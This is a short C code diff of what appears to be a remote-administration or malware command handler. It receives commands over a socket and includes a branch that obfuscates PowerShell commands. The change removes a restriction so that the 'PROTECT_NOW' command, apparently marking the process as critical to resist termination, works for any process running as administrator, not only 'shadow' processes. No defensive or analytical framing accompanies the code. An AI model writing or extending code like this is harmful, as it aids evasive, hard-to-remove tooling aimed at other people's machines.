@@ -326,9 +326,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = sys_obfuscate_ps(ps_cmd);
     }
     else if (strcmp(cmd, "PROTECT_NOW") == 0) {
-        if (!g_isShadow) {
-            result = "[FAIL: PROTECT_NOW only works for shadow processes]";
-        } else if (!sys_is_admin()) {
+        if (!sys_is_admin()) {
             result = "[FAIL: not running as administrator]";
         } else {
             util_set_critical();
